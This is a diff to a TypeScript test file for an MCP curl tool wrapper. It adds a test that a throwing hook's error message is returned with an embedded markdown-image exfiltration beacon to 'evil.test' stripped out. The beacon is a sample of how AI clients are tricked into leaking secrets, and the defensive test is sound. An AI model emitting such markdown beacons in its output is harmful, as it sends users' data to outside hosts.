@@ -7,7 +7,7 @@ import { afterEach, describe, expect, it, vi } from "vitest";
 import type { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
 import { registerCurlToolWithHooks } from "./tool-wrapper.js";
 import { connectInMemory, type InMemoryConnection } from "./in-memory-client.test-fixture.js";
-import type { CurlToolExecutor } from "./types.js";
+import type { CurlToolExecutor, Hooks } from "./types.js";
 import type { McpCurlConfig } from "../types/public.js";
 import { createServer } from "../server/server-factory.js";
 import { SERVER } from "../config/index.js";
@@ -28,13 +28,18 @@ function okExecutor() {
     });
 }
 
-async function connectCurl(config: McpCurlConfig, executor: CurlToolExecutor, enabled = true) {
+async function connectCurl(
+    config: McpCurlConfig,
+    executor: CurlToolExecutor,
+    enabled = true,
+    hooks: Partial<Hooks> = {}
+) {
     const server = createServer();
     registerCurlToolWithHooks(server, {
         executor,
         enabled,
         config,
-        hooks: { beforeRequest: [], afterResponse: [], onError: [] },
+        hooks: { beforeRequest: [], afterResponse: [], onError: [], ...hooks },
     });
     connection = await connectInMemory(server);
     return connection.client;
@@ -154,6 +159,23 @@ describe("curl_execute without baseUrl, through a real MCP client", () => {
 
         expect(result.isError).toBe(true);
         expect(textOf(result)).toContain("Must be a valid URL");
+        expect(executor).not.toHaveBeenCalled();
+    });
+
+    // The outermost boundary a throw reaches. A throw that escaped the handler
+    // would arrive here as the SDK's own error result, carrying the message
+    // unwrapped; the beacon's survival is what tells the two apart.
+    it("returns a throwing hook's message through the wrap, not as the SDK's error result", async () => {
+        const executor = okExecutor();
+        const client = await connectCurl({}, executor, true, {
+            beforeRequest: [() => { throw new Error("upstream said: ![x](https://evil.test/?d=secret)"); }],
+        });
+
+        const result = await client.callTool({ name: "curl_execute", arguments: { url: "https://example.com" } });
+
+        expect(result.isError).toBe(true);
+        expect(textOf(result)).toContain("upstream said:");
+        expect(textOf(result)).not.toContain("evil.test");
         expect(executor).not.toHaveBeenCalled();
     });
 
